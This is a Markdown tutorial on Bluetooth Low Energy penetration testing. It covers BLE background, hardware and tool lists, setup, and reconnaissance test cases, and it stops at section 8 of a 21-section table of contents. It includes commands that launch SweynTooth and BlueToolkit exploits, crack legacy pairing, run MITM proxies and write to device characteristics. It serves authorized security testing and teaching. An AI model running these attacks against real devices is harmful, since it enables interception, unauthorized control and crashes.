# 🔵 BLE (Bluetooth Low Energy) Penetration Testing — Complete End-to-End Guide

> **⚠️ Legal Disclaimer:** This guide is strictly for **authorized security research, ethical hacking, and professional penetration testing** engagements. Always obtain **written permission** before testing any device or network that you do not own. Unauthorized interception, jamming, or manipulation of Bluetooth communications is illegal in most jurisdictions (e.g., Computer Fraud and Abuse Act (CFAA) in the US, Computer Misuse Act in the UK). The authors bear no responsibility for misuse.

---

## Table of Contents

1. [Understanding BLE — Deep Technical Foundation](#1-understanding-ble--deep-technical-foundation)
2. [BLE Protocol Stack — Layer by Layer](#2-ble-protocol-stack--layer-by-layer)
3. [BLE Security Architecture](#3-ble-security-architecture)
4. [Attack Surface & Threat Model](#4-attack-surface--threat-model)
5. [Hardware Tools for BLE Pentesting](#5-hardware-tools-for-ble-pentesting)
6. [Software Tools — The Complete Arsenal](#6-software-tools--the-complete-arsenal)
7. [Environment Setup — Step by Step](#7-environment-setup--step-by-step)
8. [Phase 1 — Reconnaissance & Discovery](#8-phase-1--reconnaissance--discovery)
9. [Phase 2 — Enumeration & GATT Analysis](#9-phase-2--enumeration--gatt-analysis)
10. [Phase 3 — Sniffing & Traffic Analysis](#10-phase-3--sniffing--traffic-analysis)
11. [Phase 4 — Pairing & Authentication Attacks](#11-phase-4--pairing--authentication-attacks)
12. [Phase 5 — GATT Exploitation](#12-phase-5--gatt-exploitation)
13. [Phase 6 — Man-in-the-Middle (MITM) Attacks](#13-phase-6--man-in-the-middle-mitm-attacks)
14. [Phase 7 — Fuzzing BLE Stacks](#14-phase-7--fuzzing-ble-stacks)
15. [Phase 8 — Denial of Service (DoS) Attacks](#15-phase-8--denial-of-service-dos-attacks)
16. [Phase 9 — Firmware & Application Layer Analysis](#16-phase-9--firmware--application-layer-analysis)
17. [Complete Test Case Catalog](#17-complete-test-case-catalog)
18. [Known Critical CVEs & Vulnerability Families](#18-known-critical-cves--vulnerability-families)
19. [Reporting & Documentation](#19-reporting--documentation)
20. [Defensive Countermeasures & Hardening](#20-defensive-countermeasures--hardening)
21. [References & Further Learning](#21-references--further-learning)

---

## 1. Understanding BLE — Deep Technical Foundation

### What is Bluetooth Low Energy?

Bluetooth Low Energy (BLE), also known as Bluetooth Smart or Bluetooth 4.x/5.x LE, is a wireless personal area network technology designed for low-power operation and short-range communication. It was introduced as part of the **Bluetooth 4.0 specification** in 2010 and has since become the backbone of IoT: smartwatches, medical devices, smart locks, fitness trackers, industrial sensors, beacons, and more.

BLE is **NOT** the same as Bluetooth Classic (BR/EDR). They share the 2.4 GHz ISM band but use entirely different protocol stacks, pairing mechanisms, and security models. BLE is designed around the concept of **infrequent, short bursts of data** — contrasted with classic Bluetooth's streaming model.

### Key BLE Concepts

| Concept | Description |
|---|---|
| **Peripheral** | The BLE device that advertises itself (e.g., a heart rate monitor, smart lock) |
| **Central** | The device that scans and connects to peripherals (e.g., smartphone, laptop) |
| **Broadcaster** | Only sends advertisement packets (no connections) |
| **Observer** | Only listens to advertisement packets (no connections) |
| **GAP (Generic Access Profile)** | Controls device discoverability, connection, and security |
| **GATT (Generic Attribute Profile)** | Defines how data is structured, transmitted, and accessed |
| **ATT (Attribute Protocol)** | Low-level protocol under GATT; handles attribute read/write |
| **SM (Security Manager)** | Handles pairing, bonding, key exchange, and encryption |
| **Profile** | A standardized collection of services (e.g., Heart Rate Profile) |
| **Service** | A logical grouping of characteristics (identified by UUID) |
| **Characteristic** | A single data value with a UUID, handle, and access properties |
| **Descriptor** | Metadata about a characteristic (e.g., CCCD for notifications) |
| **Handle** | A 16-bit address used to reference attributes in ATT |
| **UUID** | Universally Unique Identifier — 16-bit (standard) or 128-bit (custom) |

### BLE Frequency Bands

BLE operates on **40 RF channels** in the 2.4 GHz ISM band:
- **3 Advertising channels**: 37 (2402 MHz), 38 (2426 MHz), 39 (2480 MHz) — specifically chosen to minimize interference with Wi-Fi channels 1, 6, and 11
- **37 Data channels**: Channels 0–36, used for actual data transfer with frequency hopping

### BLE Connection Process (Step by Step)

```
[Peripheral]                        [Central]
     |                                   |
     |--- ADV_IND (Advertisement) -----> |  Peripheral broadcasts on ch 37,38,39
     |                                   |
     | <-- SCAN_REQ (Optional) --------- |  Central may ask for more data
     |                                   |
     |--- SCAN_RSP (Scan Response) ----> |  Peripheral replies with extra info
     |                                   |
     | <-- CONNECT_IND (LLCP) --------- |  Central sends connection request
     |                                   |
     |=== CONNECTION ESTABLISHED ========|
     |                                   |
     |=== GATT Service Discovery ========|  Enumerate services, characteristics
     |                                   |
     |=== PAIRING (if required) =========|  Security Manager Protocol
     |                                   |
     |=== DATA EXCHANGE =================|  Read/Write/Notify/Indicate
```

### Advertisement Packet Structure

```
+--------+----------+----------+----------+----------+
| Preamble | Access Address | PDU Header | PDU Payload | CRC |
|  1 byte  |   4 bytes      |  2 bytes   | 0-37 bytes  | 3B  |
+--------+----------+----------+----------+----------+
```

Advertisement PDU Types:
- `ADV_IND` — Connectable undirected advertising (most common)
- `ADV_DIRECT_IND` — Connectable directed advertising (to a specific device)
- `ADV_NONCONN_IND` — Non-connectable undirected (beacons)
- `ADV_SCAN_IND` — Scannable undirected
- `SCAN_REQ` / `SCAN_RSP` — Active scanning exchange

---

## 2. BLE Protocol Stack — Layer by Layer

```
+--------------------------------------------------+
|            Application / Profile Layer            |
|   (Heart Rate, Proximity, Custom App Logic)       |
+--------------------------------------------------+
|                   GATT Layer                      |
|   (Services, Characteristics, Descriptors)        |
+--------------------------------------------------+
|                   ATT Layer                       |
|   (Attribute Protocol - Read/Write/Notify)        |
+--------------------------------------------------+
|                    SMP Layer                      |
|   (Security Manager Protocol - Pairing/Bonding)  |
+--------------------------------------------------+
|                    L2CAP Layer                    |
|   (Logical Link Control and Adaptation Protocol) |
+--------------------------------------------------+
|               LL (Link Layer)                     |
|   (Connection Management, Channel Hopping)        |
+--------------------------------------------------+
|              PHY (Physical Layer)                 |
|   (2.4 GHz ISM, 40 channels, 1Mbps/2Mbps/Coded) |
+--------------------------------------------------+
```

### Link Layer (LL) States

```
STANDBY → ADVERTISING → SCANNING → INITIATING → CONNECTION → SYNCHRONIZATION
```

The Link Layer manages:
- **Channel Selection Algorithm** (CSA #1 and #2 in BLE 5.x)
- **Connection parameter negotiation** (interval, latency, timeout)
- **Encryption** (AES-128 CCM)
- **Data PDUs** (LL Data, LL Control)

### GATT Hierarchy (Visual)

```
Device
└── Profile (e.g., Heart Rate Profile)
    └── Service (UUID: 0x180D - Heart Rate)
        ├── Characteristic (UUID: 0x2A37 - Heart Rate Measurement)
        │   ├── Value (actual bytes)
        │   └── Descriptor (UUID: 0x2902 - CCCD - enable notifications)
        ├── Characteristic (UUID: 0x2A38 - Body Sensor Location)
        │   └── Value
        └── Characteristic (UUID: 0x2A39 - Heart Rate Control Point)
            └── Value (writable)
```

### Characteristic Property Flags (1 byte bitmask)

| Bit | Property | Description |
|---|---|---|
| 0 | BROADCAST | Value can be broadcast |
| 1 | READ | Client can read value |
| 2 | WRITE_NO_RESP | Client can write without response |
| 3 | WRITE | Client can write with response |
| 4 | NOTIFY | Server can notify client (no ack) |
| 5 | INDICATE | Server can indicate (with ack) |
| 6 | AUTH_SIGNED_WRITE | Signed write operation |
| 7 | EXTENDED_PROP | Extended properties available |

---

## 3. BLE Security Architecture

### Security Modes and Levels

BLE defines security through **modes** and **levels** within those modes:

**Security Mode 1** (Encryption-based):
| Level | Description |
|---|---|
| Level 1 | No security (plaintext, no authentication) |
| Level 2 | Unauthenticated pairing with encryption (Just Works) |
| Level 3 | Authenticated pairing with encryption (passkey/OOB) |
| Level 4 | Authenticated LE Secure Connections with 128-bit encryption |

**Security Mode 2** (Data signing):
| Level | Description |
|---|---|
| Level 1 | Unauthenticated pairing with data signing |
| Level 2 | Authenticated pairing with data signing |

### Pairing Methods (Security Manager Protocol)

#### Legacy Pairing (BLE 4.x)
Uses **STK (Short-Term Key)** derived via TK (Temporary Key):

| Association Model | I/O Capability | Description | MITM Protection |
|---|---|---|---|
| **Just Works** | Neither device has I/O | TK = 0x000...0 | ❌ None |
| **Passkey Entry** | One displays, one enters | 6-digit passkey (0-999999) | ✅ Yes |
| **OOB (Out of Band)** | External channel (NFC, QR) | TK via external channel | ✅ Yes |

#### LE Secure Connections (BLE 4.2+)
Uses **Elliptic Curve Diffie-Hellman (ECDH)** with P-256 curve. Generates **LTK (Long-Term Key)** directly — eliminates STK. Much more secure against passive eavesdropping.

### Key Hierarchy

```
IRK  → Identity Resolving Key (for Private Address Resolution)
LTK  → Long-Term Key (session encryption key)
CSRK → Connection Signature Resolving Key (for signed writes)
```

### BLE Address Types

| Type | Description | Security Implication |
|---|---|---|
| **Public Address** | Fixed IEEE-assigned MAC (OUI visible) | Fully trackable |
| **Static Random** | Random but fixed per power cycle | Trackable within session |
| **Non-Resolvable Private** | Randomly generated, changes frequently | Hard to track |
| **Resolvable Private (RPA)** | Changes but can be resolved with IRK | Trackable by bonded peers |

---

## 4. Attack Surface & Threat Model

### Attacker Positions

```
[Passive Attacker]  ──→ Sniffs unencrypted traffic or traffic with captured keys
[Active Attacker]   ──→ Sends crafted packets (fuzzing, injection)
[MITM Attacker]     ──→ Proxies traffic between Central and Peripheral
[Physical Attacker] ──→ Has physical access to device (firmware extraction)
[App-Layer Attacker]──→ Reverses companion mobile app
```

### Attack Categories

1. **Reconnaissance** — Passive scanning, fingerprinting
2. **Device Tracking** — MAC address correlation
3. **Eavesdropping** — Passive packet capture
4. **Authentication Bypass** — Pairing downgrade, Just Works exploitation
5. **MITM** — Relay/proxy attacks between central and peripheral
6. **Replay Attacks** — Replaying captured commands
7. **GATT Exploitation** — Unauthorized read/write of characteristics
8. **Denial of Service** — Flooding, invalid packet injection, jamming
9. **Fuzzing** — Malformed packet injection into BLE stacks
10. **Firmware Attacks** — Extracting/modifying embedded firmware
11. **Mobile App Attacks** — Reversing companion app for hardcoded keys/logic

---

## 5. Hardware Tools for BLE Pentesting

### 🥇 Tier 1 — Primary Research Hardware

#### Ubertooth One
- **Purpose**: Open-source Bluetooth sniffer and analyzer
- **Manufacturer**: Great Scott Gadgets
- **Price**: ~$120 USD
- **Capabilities**:
  - Real-time BLE packet capture on all 3 advertising channels
  - Follows connection hopping sequence (with known access address)
  - Works with Wireshark via `ubertooth-btle` pipe
  - RSSI measurements
  - Jamming capabilities (for authorized testing)
- **GitHub**: https://github.com/greatscottgadgets/ubertooth
- **Install**:
  ```bash
  sudo apt install ubertooth
  ubertooth-btle -f -c /tmp/ble.pcap  # Follow connections, save to pcap
  ```
- **Limitations**: Cannot decode encrypted traffic without capturing the pairing exchange; limited to 1 Mbps PHY

#### Nordic Semiconductor nRF52840 USB Dongle
- **Purpose**: Multi-protocol USB dongle — #1 choice for BLE sniffing in practice
- **Price**: ~$10–$40 USD (official), cheaper clones available
- **Capabilities**:
  - BLE 5.0 support (1Mbps, 2Mbps, Coded PHY)
  - All 40 BLE channels
  - Works with Wireshark via nRF Sniffer plugin
  - Also supports Zigbee, Thread, IEEE 802.15.4
  - Can be reflashed for different firmware (e.g., Adafruit bootloader for custom BLE scripts)
- **Wireshark Integration**:
  ```bash
  # Install nRF Sniffer Wireshark plugin from Nordic
  # Flash dongle with sniffer firmware
  # Launch: wireshark -i /dev/ttyACM0
  ```
- **Best for**: BLE sniffing inside VMs (USB passthrough)

#### HackRF One
- **Purpose**: Software-defined radio (SDR) — broadband receiver/transmitter
- **Price**: ~$300 USD
- **Frequency Range**: 1 MHz – 6 GHz
- **Capabilities**:
  - Full BLE protocol analysis with GNU Radio or `gr-bluetooth`
  - Wideband Bluetooth sniffing (all channels simultaneously with proper setup)
  - SDR-based replay attacks
  - Works with `btlejuice-sdr` and related tools
- **GitHub**: https://github.com/mossmann/hackrf
- **Note**: Requires significant DSP knowledge for BLE-specific tasks; nRF52840 is usually more practical for pure BLE work

#### YARD Stick One
- **Purpose**: Sub-1 GHz USB transceiver
- **Note**: Not for 2.4 GHz BLE — used for other wireless protocols (Z-Wave, key fobs) often found in IoT pentests alongside BLE devices

#### BladeRF 2.0 Micro
- **Purpose**: High-end SDR with full-duplex capability
- **Price**: ~$480 USD
- **Capabilities**:
  - Wireshark-compatible all-channel BLE sniffer
  - Support for simultaneous TX/RX (useful for MITM)
  - Works with `bladeRF-wireshark` tool
  - Higher SNR than HackRF

---

### 🥈 Tier 2 — Multi-Protocol Research Devices

#### Flipper Zero
- **Purpose**: Portable multi-tool for pentesters
- **Price**: ~$169 USD
- **BLE Capabilities**:
  - BLE advertising packet scanner (detect nearby devices)
  - BLE spam attacks (spam iOS/Android with fake connection requests)
  - Custom firmware (Unleashed, Momentum) adds extended BLE features
  - Works with ESP32 add-on board for extended Wi-Fi + BLE capabilities
- **GitHub**: https://github.com/flipperdevices/flipperzero-firmware
- **Custom Firmware**: https://github.com/DarkFlippers/unleashed-firmware
- **Limitations**: Not a full protocol analyzer; more useful for discovery and simple interactions

#### ESP32 (Espressif)
- **Purpose**: Cheap, powerful SoC with built-in BLE + Wi-Fi
- **Price**: ~$5–$15 USD
- **Use Cases**:
  - Build custom BLE peripheral/central emulators
  - BLE fuzzing with custom Arduino/IDF firmware
  - BLE advertisement spoofing
  - BLE MITM proxy with two radios
- **Libraries**: `NimBLE-Arduino`, ESP-IDF's `esp_bt` stack

#### Raspberry Pi (3/4/5 with built-in BLE)
- **Purpose**: Linux-based BLE research platform
- **Built-in BLE**: Yes (limited sniffing capability without external dongle)
- **Use Cases**:
  - Run full Linux BLE toolchain
  - Combine with nRF52840 dongle for sniffing
  - Host Bettercap, GATTacker, WHAD
  - Portable field pentest setup

#### CrazyRadio PA
- **Purpose**: 2.4 GHz USB radio (nRF24L01+)
- **Use Cases**: MouseJacking attacks, not standard BLE
- **Note**: Useful for devices using proprietary 2.4 GHz protocols (Logitech keyboards/mice)

---

### 🥉 Tier 3 — Supporting Hardware

| Device | Purpose | Price |
|---|---|---|
| **Alfa AWUS036ACH** | Wi-Fi adapter with monitor mode (for 2.4 GHz proximity) | ~$40 |
| **USB Bluetooth 4.0+ Dongle** | Basic Linux BLE stack (hciconfig/bluetoothctl) | ~$10 |
| **Bus Pirate** | UART/SPI/I2C for embedded debug/firmware extraction | ~$30 |
| **J-Link / ST-Link** | JTAG/SWD for BLE SoC firmware debugging/dumping | ~$20–$500 |
| **nRF52 DK (Development Kit)** | Nordic eval board for custom BLE firmware dev | ~$50 |
| **Proxmark3 RDV4** | RFID/NFC (companion to BLE for access control testing) | ~$300 |

---

## 6. Software Tools — The Complete Arsenal

### 🔍 Discovery & Scanning

#### hcitool + hciconfig (BlueZ)
Linux built-in BLE tools. Part of the `bluez` package.
```bash
# Check adapter
hciconfig -a

# Bring up adapter
sudo hciconfig hci0 up

# Scan for BLE devices (legacy, deprecated in newer kernels)
sudo hcitool lescan

# Active scan (includes scan responses)
sudo hcitool lescan --active
```

#### bluetoothctl (Modern BlueZ CLI)
```bash
bluetoothctl
# In the interactive shell:
power on
scan on
devices
info <MAC>
```

#### Bettercap
**GitHub**: https://github.com/bettercap/bettercap  
**Language**: Go  
**Description**: Swiss Army knife for 802.11, BLE, HID, IPv4/IPv6 networks — reconnaissance and MITM.

```bash
# Install
sudo apt install bettercap
# or
go install github.com/bettercap/bettercap@latest

# Launch
sudo bettercap

# BLE Commands (inside bettercap shell)
ble.recon on                    # Start BLE scanning
ble.show                        # Show discovered devices
ble.enum AA:BB:CC:DD:EE:FF      # Enumerate all GATT services/characteristics
ble.write AA:BB:CC:DD:EE:FF <UUID> <hex_data>  # Write to characteristic
```

#### BlueZ Stack Tools (Legacy but still widely used)
```bash
# Install legacy tools (Debian/Ubuntu)
sudo apt install bluez bluez-tools

# Install deprecated but functional tools
sudo apt install bluetooth bluez-hcidump

# Capture HCI traffic
sudo btmon -w capture.btsnoop

# L2ping (ping over BLE L2CAP)
sudo l2ping -i hci0 -c 10 AA:BB:CC:DD:EE:FF
```

---

### 🔬 GATT Enumeration & Interaction

#### gatttool (BlueZ)
**Status**: Officially deprecated but still widely distributed and functional.
```bash
# Interactive mode
sudo gatttool -b AA:BB:CC:DD:EE:FF -I

# Interactive commands:
[AA:BB:CC:DD:EE:FF][LE]> connect
[AA:BB:CC:DD:EE:FF][LE]> primary              # List services
[AA:BB:CC:DD:EE:FF][LE]> characteristics      # List characteristics
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0012 # Read by handle
[AA:BB:CC:DD:EE:FF][LE]> char-write-req 0x0014 01  # Write with response
[AA:BB:CC:DD:EE:FF][LE]> char-write-cmd 0x0014 01  # Write without response

# Non-interactive:
gatttool -b AA:BB:CC:DD:EE:FF --char-read -a 0x0012
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0014 -n 01
gatttool -b AA:BB:CC:DD:EE:FF --char-read --uuid=00002a29-0000-1000-8000-00805f9b34fb

# Authenticated/Encrypted connection
gatttool --sec-level=high -b AA:BB:CC:DD:EE:FF -I

# Enable notifications (write 0x0100 to CCCD descriptor)
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0013 -n 0100 --listen
```

#### gatt-python (Python BLE Library)
```bash
pip install gatt
```
```python
import gatt

class AnyDeviceManager(gatt.DeviceManager):
    def device_discovered(self, device):
        print(f"Discovered: {device.mac_address} {device.alias()}")

class AnyDevice(gatt.Device):
    def connect_succeeded(self):
        super().connect_succeeded()
        print(f"Connected to {self.mac_address}")
    
    def services_resolved(self):
        super().services_resolved()
        for service in self.services:
            print(f"Service: {service.uuid}")
            for char in service.characteristics:
                print(f"  Characteristic: {char.uuid} | Props: {char.properties}")

manager = AnyDeviceManager(adapter_name='hci0')
device = AnyDevice(mac_address='AA:BB:CC:DD:EE:FF', manager=manager)
device.connect()
manager.run()
```

#### bleak (Modern Python BLE — Cross-Platform)
**GitHub**: https://github.com/hbldh/bleak  
**Supports**: Linux, macOS, Windows
```bash
pip install bleak
```
```python
import asyncio
from bleak import BleakScanner, BleakClient

# Scan for devices
async def scan():
    devices = await BleakScanner.discover(timeout=5.0)
    for d in devices:
        print(f"{d.address} | {d.name} | RSSI: {d.rssi}")

# Connect and enumerate GATT
async def enumerate(address):
    async with BleakClient(address) as client:
        print(f"Connected: {client.is_connected}")
        for service in client.services:
            print(f"[Service] {service.uuid}: {service.description}")
            for char in service.characteristics:
                print(f"  [Char] {char.uuid} | Props: {char.properties}")
                if "read" in char.properties:
                    try:
                        val = await client.read_gatt_char(char.uuid)
                        print(f"    Value: {val.hex()}")
                    except Exception as e:
                        print(f"    Read error: {e}")

asyncio.run(scan())
asyncio.run(enumerate("AA:BB:CC:DD:EE:FF"))
```

#### BLEsuite (Python GATT Framework)
**GitHub**: https://github.com/optiv/blesuite  
Comprehensive BLE security testing toolkit with GATT server/client emulation.
```bash
git clone https://github.com/optiv/blesuite
cd blesuite && pip install -e .
```
```python
from blesuite.pybt.gatt import Server
from blesuite.connection_manager import BLEConnectionManager

# Create connection manager
connection_manager = BLEConnectionManager(adapter=0, role='central')
connection = connection_manager.connect("AA:BB:CC:DD:EE:FF")
device = connection.read_device_information()
device.export_device_to_json("device_profile.json")
```

---

### 📡 Sniffing & Traffic Analysis

#### Wireshark (with BLE support)
```bash
# Capture with btmon
sudo btmon -w capture.btsnoop
# Open in Wireshark: File > Open > capture.btsnoop

# Capture via nRF52840 + nRF Sniffer plugin
# Follow Nordic's setup guide at: https://infocenter.nordicsemi.com

# Useful Wireshark BLE display filters:
btle                            # All BLE traffic
btle.advertising_header         # Advertisement packets
btatt                           # ATT protocol (GATT)
btsmp                           # Security Manager Protocol
btl2cap                         # L2CAP layer
btatt.opcode == 0x52            # Write Request
btatt.opcode == 0x1b            # Handle Value Notification
btsmp.opcode == 0x01            # Pairing Request
```

#### Ubertooth BLE Capture
```bash
# Install
sudo apt install ubertooth

# Passive BLE sniffing (all advertising channels)
ubertooth-btle -f                          # Follow connections
ubertooth-btle -f -c /tmp/ble.pcap        # Save to pcap
ubertooth-btle -f -t AA:BB:CC:DD:EE:FF    # Follow specific target

# Pipe to Wireshark in real time
mkfifo /tmp/ble_pipe
ubertooth-btle -f -c /tmp/ble_pipe &
wireshark -k -i /tmp/ble_pipe
```

#### CrackLE — Crack BLE Encryption
**GitHub**: https://github.com/mikeryan/crackle  
Cracks BLE Legacy Pairing encryption if the pairing exchange was captured.
```bash
git clone https://github.com/mikeryan/crackle
cd crackle && make
./crackle -i capture.pcap -o decrypted.pcap
```
**Requires**: Full pairing exchange (Pairing Request, Pairing Response, Pairing Confirm, Pairing Random) captured.

---

### 🎭 MITM Frameworks

#### GATTacker
**GitHub**: https://github.com/securing/gattacker  
**Language**: Node.js  
**Description**: BLE MITM framework; presented at Black Hat USA 2016.

```bash
# Install
npm install -g gattacker

# Scan for devices
node scan.js

# Clone a device profile
node clone.js AA:BB:CC:DD:EE:FF

# Act as a proxy between the real device and the central
node proxy.js
```

#### BTLEJuice
**GitHub**: https://github.com/DigitalSecurity/btlejuice  
**Language**: Node.js  
**Description**: Bluetooth Smart MITM framework. Presented at DEF CON 24.

```bash
npm install -g btlejuice btlejuice-proxy

# On proxy device (intercepts real peripheral)
btlejuice-proxy

# On main device (creates fake peripheral, connects to central)
btlejuice -u <proxy_ip>
# Access web UI at http://localhost:8080
```

#### WHAD (Wireless Hacking Attack Dashboard)
**GitHub**: https://github.com/whad-team/whad-client  
**Description**: Modern unified wireless attack framework (2024). Supports BLE, Zigbee, Wi-Fi.
```bash
pip install whad
# Supports nRF52840, HackRF, Ubertooth
wplay ble connect -i hci0 AA:BB:CC:DD:EE:FF
```

---

### 🔧 Fuzzing Tools

#### SweynTooth PoC
**GitHub**: https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks  
Fuzzes BLE LL (Link Layer) and L2CAP with SweynTooth vulnerabilities.
```bash
git clone https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks
cd sweyntooth_bluetooth_low_energy_attacks
pip install -r requirements.txt
# Requires nRF52840 DK with specific firmware
python3 ll_length_overflow.py AA:BB:CC:DD:EE:FF  # CVE-2019-16336
```

#### BrakTooth PoC
**GitHub**: https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks  
Tests BrakTooth vulnerabilities in Bluetooth Classic stacks.

#### Frankenstein Fuzzer
**Paper**: USENIX Security 2020  
**GitHub**: https://github.com/seemoo-lab/frankenstein  
Advanced wireless firmware fuzzing targeting Broadcom/Cypress BLE chips. Emulates the chip firmware to fuzz the BLE stack directly.

#### Boofuzz + BLE Plugin
**GitHub**: https://github.com/jtpereyda/boofuzz  
Generic fuzzing framework; with custom BLE primitives.
```bash
pip install boofuzz
```

#### NimBLE-based Custom Fuzzer (ESP32)
Write custom BLE fuzzing firmware on ESP32 targeting ATT/GATT protocol layers:
```cpp
// Example: Send malformed ATT packets via NimBLE
NimBLEClient* pClient = NimBLEDevice::createClient();
pClient->connect(address);
// Craft and send raw ATT packets with invalid opcodes/lengths
```

---

### 🛡️ Analysis & Reversing

#### nRF Connect (Mobile App)
- **Platform**: iOS, Android
- **Use**: Connect to BLE devices, enumerate services/characteristics, read/write values, enable notifications
- **Great for**: Quick field assessment without a laptop

#### LightBlue (Mobile App)
- **Platform**: iOS, Android
- **Use**: BLE scanner, GATT inspector, advertise custom BLE peripherals

#### Frida (Dynamic Instrumentation)
```bash
pip install frida-tools

# Hook BLE APIs in a mobile app
frida -U -l ble_hook.js com.target.app
```
```javascript
// ble_hook.js — Hook Android BLE write
Java.perform(function() {
    var BluetoothGatt = Java.use('android.bluetooth.BluetoothGatt');
    BluetoothGatt.writeCharacteristic.overload(
        'android.bluetooth.BluetoothGattCharacteristic'
    ).implementation = function(characteristic) {
        var value = characteristic.getValue();
        console.log('[BLE Write] UUID: ' + characteristic.getUuid() + 
                    ' Value: ' + bytesToHex(value));
        return this.writeCharacteristic(characteristic);
    };
});
```

#### apktool / jadx — Android App Reversing
```bash
# Decompile APK
apktool d target.apk -o output/
jadx -d jadx_output/ target.apk

# Search for hardcoded UUIDs and keys
grep -r "UUID" jadx_output/ --include="*.java"
grep -r "SERVICE_UUID\|CHAR_UUID\|0000" jadx_output/ --include="*.java"
grep -ri "password\|key\|secret\|token" jadx_output/ --include="*.java"
```

#### binwalk + Ghidra — Firmware Analysis
```bash
# Extract firmware contents
binwalk -e firmware.bin

# Analyze in Ghidra with ARM Cortex-M processor
# Look for BLE stack symbols, crypto routines, hardcoded keys
```

---

### 🆕 Latest Tools (2024–2026)

#### BlueFusion
**GitHub**: https://github.com/ebowwa/BlueFusion  
AI-powered dual BLE interface controller — combines native BLE with USB sniffer dongles.
```bash
git clone https://github.com/ebowwa/BlueFusion
cd BlueFusion && ./install.sh
python bluefusion.py scan
```

#### BlueToolkit
**GitHub**: https://github.com/sgxgsx/BlueToolkit  
Extensible Bluetooth vulnerability testing framework with 43 built-in exploits. Tested against 22 car models finding 60+ vulnerabilities.
```bash
git clone https://github.com/sgxgsx/BlueToolkit
cd BlueToolkit && pip install -r requirements.txt
python bluetoolkit.py --target AA:BB:CC:DD:EE:FF --all-exploits
```

#### SbleedyGonzales
**GitHub**: Flexible framework for testing BLE BR/EDR vulnerabilities (2024).

#### Modular BLE Exploitation Framework (MBEF)
**GitHub**: https://github.com/topics/bluetooth-hacking (search "modular offensive BLE")  
Features anomaly detection, plugin-based attacks, and offline sandbox replay.

---

## 7. Environment Setup — Step by Step

### Kali Linux Setup (Recommended)

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install BLE tools
sudo apt install -y \
    bluez \
    bluetooth \
    bluez-tools \
    bluez-hcidump \
    wireshark \
    tshark \
    ubertooth \
    python3-pip \
    python3-venv \
    nodejs \
    npm \
    git \
    nmap \
    aircrack-ng

# Install Python BLE libraries
pip3 install bleak gatt blesuite scapy

# Install Bettercap
sudo apt install bettercap
# or from source:
go install github.com/bettercap/bettercap@latest

# Install GATTacker
npm install -g gattacker

# Install BTLEJuice  
npm install -g btlejuice btlejuice-proxy

# Clone useful repositories
mkdir ~/ble-pentest && cd ~/ble-pentest
git clone https://github.com/engn33r/awesome-bluetooth-security
git clone https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks
git clone https://github.com/mikeryan/crackle
git clone https://github.com/securing/gattacker
git clone https://github.com/Charmve/BLE-Security-Attack-Defence
git clone https://github.com/sgxgsx/BlueToolkit
```

### Verify Hardware Setup

```bash
# Check if BLE adapter is detected
hciconfig -a

# Expected output:
# hci0: Type: Primary  Bus: USB
#       BD Address: XX:XX:XX:XX:XX:XX  ACL MTU: 1021:8  SCO MTU: 64:1
#       UP RUNNING
#       ...

# If down, bring up:
sudo hciconfig hci0 up

# Verify Ubertooth
ubertooth-util -v        # Should show firmware version
ubertooth-util -p        # Ping test

# Verify nRF52840 sniffer
ls /dev/ttyACM*          # Should appear when dongle plugged in
```

### VM Configuration Notes

- Pass through USB BLE adapter (nRF52840 or CSR dongle) to VM
- VirtualBox: Devices → USB → Enable USB Controller → Add Filter for your dongle
- VMware: VM → Settings → USB Controller → Add device
- Built-in host Bluetooth generally NOT accessible from VMs

---

## 8. Phase 1 — Reconnaissance & Discovery

### Objective
Identify all BLE devices in range, gather device information, understand the target environment.

### TC-001: Passive BLE Device Scan

```bash
# Method 1: bluetoothctl (modern, recommended)
bluetoothctl
scan on
# Wait 30–60 seconds
devices
scan off

# Method 2: hcitool (legacy, still functional)
sudo hcitool lescan
sudo hcitool lescan --active   # Active scan (gets Scan Response data too)

# Method 3: Bettercap (richest output)
sudo bettercap
>> ble.recon on
>> ble.show        # Live table of all discovered devices
```

**What to collect:**
- BD_ADDR (MAC address)
- Device name (if advertised)
- Manufacturer data (AD type 0xFF)
- Complete/Incomplete list of 16-bit UUIDs
- Appearance value
- TX Power level
- RSSI (signal strength → estimate distance)
- Flags (General Discoverable, BR/EDR not supported, etc.)

### TC-002: Active Scanning (Scan Response Capture)

```bash
# Active scan sends SCAN_REQ → gets SCAN_RSP with additional data
sudo hcitool lescan --active

# Bettercap always does active scan
sudo bettercap -eval "ble.recon on"
```

### TC-003: Device Fingerprinting

```bash
# Extract manufacturer from OUI
# Website: https://www.macvendorlookup.com
# or use: macchanger --lookup AA:BB:CC:DD:EE:FF

# Use Bettercap's built-in OUI lookup
>> ble.show   # Column "Vendor" shows OUI-resolved manufacturer

# Advanced fingerprinting with nmap (if device has IP)
nmap -sV --script bluetooth-info AA:BB:CC:DD:EE:FF

# Identify device type from UUIDs
# 0x180A = Device Information Service → IoT/embedded device
# 0x180D = Heart Rate → fitness/medical
# 0x1800 = Generic Access → all BLE devices
# 0xFFF0 (custom) → vendor-specific, needs reversing
```

### TC-004: Advertisement Data Analysis

Capture and decode raw advertisement packets:
```bash
# Capture to pcap
sudo btmon -w adv_capture.btsnoop

# Analyze in Wireshark
# Filter: btle.advertising_header.pdu_type == 0x00  (ADV_IND)
# Decode AD structures manually or use Python:

from bleak import BleakScanner

async def detailed_scan():
    def callback(device, adv_data):
        print(f"\n=== Device: {device.address} ===")
        print(f"  Name: {device.name}")
        print(f"  RSSI: {adv_data.rssi} dBm")
        print(f"  TX Power: {adv_data.tx_power}")
        print(f"  UUIDs: {adv_data.service_uuids}")
        print(f"  Manufacturer: {adv_data.manufacturer_data}")
        print(f"  Service Data: {adv_data.service_data}")
    
    async with BleakScanner(callback) as scanner:
        await asyncio.sleep(10.0)

import asyncio
asyncio.run(detailed_scan())
```

### TC-005: Identify Connectable vs. Non-Connectable Devices

Advertisement PDU type reveals connectivity:
- `ADV_IND` (0x00) → Connectable, undirected — primary target
- `ADV_DIRECT_IND` (0x01) → Connectable, directed (paired device expected)
- `ADV_NONCONN_IND` (0x02) → Beacons (iBeacon, Eddystone) — no connection
